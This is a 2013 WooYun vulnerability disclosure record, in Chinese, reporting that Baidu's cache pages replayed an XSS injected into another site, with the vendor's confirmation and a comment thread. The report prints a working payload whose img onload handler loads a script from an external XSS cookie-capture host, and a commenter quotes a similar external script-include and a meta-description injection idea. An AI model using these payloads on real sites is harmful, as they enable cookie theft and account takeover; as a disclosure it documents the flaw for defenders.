{"id": 14516, "wybug_id": "wooyun-2013-016946", "wybug_title": "名副其实的“跨”站脚本攻击，百度cache存在安全漏洞（无心插柳柳成荫）", "wybug_corp": "百度", "wybug_author": "px1624", "wybug_date": "2013-01-05 16:43", "wybug_open_date": "2013-02-19 16:44", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["百度"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-01-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-01-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-01-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-01-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-02-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-02-19：\t细节向公众公开  简要描述： XSS了一下大街网，具体可以看 http://www.wooyun.org/bugs/wooyun-2013-016942，莫名其妙的XSS到了百度。看了下，原来是百度的某个功能不安全额。。。 详细说明：  1 之前XSS了一下大街网，在抓的的cookie中竟然看到了百度的域名，很是欣喜。\n\n2 看了一下，是百度快照，既然能被XSS到，就说明百度快照这里也没有过滤我在大街网那个页面插入的XSS 恶意代码。3 用F12看了下，果然如此，恶意代码如下。\n<img src=\"http://fs3u.dajie.com/2013/01/05/146/13573533461773126m.jpg\" onload=\"s=document.createElement('script');s.src='http://xsser.me/Du8ka9?'+Math.random();document.body.appendChild(s)\" border=\"0\">\n\n\n4 同理如果其他站有XSS的话，百度快照还是会中招。可以自己XSS自己网站，然后通过百度快照去XSS百度。可以说是普遍撒网，特殊捞鱼。5 百度快照中招了，由于百度很多地方的cookie是通用的，所以危害可想而知了，直接可以登录别人帐号。\n\n   漏洞证明：  看这个地址：http://cache.baidu.com/c?m=9d78d513d9d431aa4f9c91690c66c0171f43f7622bd6a0020ed2843be0732a325012e5ac26525a4592d27d1716d9494b9a802103361450b38f8fc814d2e1d46e6d9f26476d01d71c4d914af3805125b676c302b2f80ee7cda16fccb3868f80154e9c08442bc7b1ca4746498834a10932e7a69942164246edab633ea1&p=9f7cc10a81934ea85b81c7710f5d&newp=837dc64ad4df1aeb05bd9b790e0892695912c10e3ad5cc4e3b89&user=baidu&fm=sc&query=%B7%C7%C4%E3%C4%AA%CA%F4xss%D2%BB%C3%B6&qid=a5f235f41256dea6&p1=1如果那个大街网的XSS还没有被删。。。   修复方案：  很羡慕那些能收到百度礼物的人。过年了，今年是本命年，求个礼物冲冲喜。   版权声明：转载请注明来源 px1624@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-01-05 18:20 厂商回复： 感谢你对百度安全的关注，我们马上安排处理~ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-01-05 16:52 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  谢谢剑心给我把标题改的那么霸气（想了半天，就是想不出一个霸气的标题），咦，危害等级我选的高，怎么成了低了。。。    \n     2013-01-05 16:55 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  @px1624 百度是httponly的，你x到的能够登录就是中，x到后台管理员帐号且是外网能够访问就是高，然后后能能够上传拿站提权上服务器就是20再加精    \n     2013-01-05 16:59 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @小胖胖要减肥 哦，这么霸气，这个洞是可以很容易骗到管理员帐号的。不过不知道外网能不能访问，之前xss到了一个of-crm.com的后台，内网才能访问，也不知道是啥网站的。。。    \n     2013-01-05 17:32 |    \t\t心伤的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:147 漏洞数:21        | 严肃点~此号为虚拟小号，并不存在实体...)\t\t \n  @小胖胖要减肥 谁说百度是httponly的，百度没httponly,新浪有。    \n     2013-01-05 17:33 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  @心伤的瘦子 哦 我xss菜鸟都没挖过 什么时候指导下    \n     2013-01-05 17:59 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @心伤的瘦子 瘦子大神来啦额！    \n     2013-01-05 18:14 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  这么多xss 悲哀啊    \n     2013-01-05 18:19 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @xsser 听说法百度漏洞可以解封帐号，求解封 百度账号id：px1624    \n     2013-01-05 20:25 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  我是来看剑总的，现在我们公司看帖有个规律，看一个帖子，先看剑总的反应，反应强烈，就收藏等待，木有啥反应的，就果断跳过。。。    \n     2013-01-05 20:46 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @鬼魅羊羔 你找到工作了？在哪高就？？    \n     2013-01-05 20:57 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  我一直有工作啊。。。在内蒙古呢，4月份去北京找基友们。。。    \n     2013-01-05 21:31 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @鬼魅羊羔 哦，前些天不是说想去金山么。。。以为你在找工作    \n     2013-01-05 22:04 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  @px1624 4月份准备去金山看看啊。。。    \n     2013-01-06 12:26 |    \t\t1ee \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:14        | 看书中....)\t\t \n  @px1624 过来瞧一瞧...    \n     2013-01-25 21:40 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  @px1624 这个情况以前遇到过，X到的地方，被其他搜索引擎或者其他站点收录后，搜索一下快照就又可以触发。。。    \n     2013-01-25 22:15 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @鬼魅羊羔 。。这个还没公开呢，你不应该把内容直接说出来的吧、、、    \n     2013-01-25 22:29 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  @px1624 嘘……别告诉别人。。    \n     2013-01-25 22:45 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @鬼魅羊羔 。。。你这不在留言中都等于给公开了么。。。    \n     2013-02-20 01:17 |    \t\tsafe121 \t\t\t( 实习白帽子  |\t\t\t        Rank:98 漏洞数:11        | http://www.gov.cn)\t\t \n  我以前试过用一个不用的网站，把 meta的description改成<script src=\"http://www.safe121.com/mjj.js\"></script> 结果不行。。    \n     2013-03-30 13:39 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @safe121 ..这个和这主题貌似么啥关系吧。。。    \n     2013-04-01 02:41 |    \t\tsafe121 \t\t\t( 实习白帽子  |\t\t\t        Rank:98 漏洞数:11        | http://www.gov.cn)\t\t \n  @px1624 百度搜索 比如搜索 fuckfuck_例句_翻译_在线翻译_短句翻译_句子翻译_金山词霸_爱词霸句库爱词霸英语句库为广大英语学习爱好者提供fuck的例句、fuck的翻译、fuck的例句翻译、fuck的短句翻译、fuck的句子翻译、fuck的整句翻译。dj.iciba.com/fuck/ 2013-3-23 - 百度快照fuck_例句_翻译_在线翻译_短句翻译_句子翻译_金山词霸_爱词霸句库爱词霸英语句库为广大英语学习爱好者提供fuck的例句、fuck的翻译、fuck的例句翻译、fuck的短句翻译、fuck的句子翻译、fuck的整句翻译。就是html meta标签description..如果控制了这个标签，别人搜索相关关键词的时候自动XSS了。。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}